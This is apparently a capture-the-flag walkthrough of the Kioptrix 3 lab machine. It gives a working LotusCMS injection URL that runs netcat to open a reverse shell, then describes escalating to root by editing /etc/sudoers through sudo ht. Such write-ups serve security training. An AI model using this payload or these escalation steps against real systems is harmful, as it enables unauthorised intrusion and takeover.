## Tools
1. [NMap](https://NMap.org)
2. dirb
3. Netcat

## Gaining Access
1. Got IP with netdiscover, in my case IP is 192.168.0.13. At first as usual scanned with nmap.
2. Running dirb gives us some links.
3. If we open the ip there is a website. 
4. If we click on login, we can get login panel powered by LotusCMS.
5. If we google `LotusCMS RCE exploit`. We can find many exploits to get RCE. So, I studied the exploit and crafted a payload for reverse shell. Opening the crafted link gives reverse shell. `http://192.168.0.13/index.php?page=index%27)%3B%24{system(%27nc+-e+%2Fbin%2Fsh+<ip address>+<port number>%27)}%3B%23` while listening on netcat if we open that link we will get a reverse shell.

## Priviledge Escalation
1. After some searching, I got some credentials inside `/home/www/kioptrix3.com/gallery/gconfig.php`.
2. We can use this credential on a previously found link using dirb `http://192.168.0.13/phpmyadmin/`. 
3. After logging in we get two username and hash inside database.
4. So, if we decrypt those hash using crackstation, we get password of `dreg` is `Mast3r` and pasword of `loneferret` is `starwars`.
5. We can get ssh using those credentials. As dreg I got nothing important. So, I tried `loneferret` and `sudo` is enabled there and got some `sudo binary`.
6. `su` is not exploitable as user `loneferret`, so I tried to exploit `ht` and to exploit `ht` I need to `export TERM=xterm`.
7. Now I found this article https://vk9-sec.com/ht-privilege-escalation/ and followed these simple steps to root. So, at first I opened `sudo ht` and then pressed `F3` to select `/etc/sudoers` to open.
8. Now added `/bin/bash` to sudoers as instructed in the article and saved the file with `F2` and quit with `F10` or `CTRL+C`.
9. Now just use `sudo /bin/bash` to get root shell.
10. Now we can find a file `Congrats.txt` inside `/root` directory and this is the flag file containing a big paragraph.
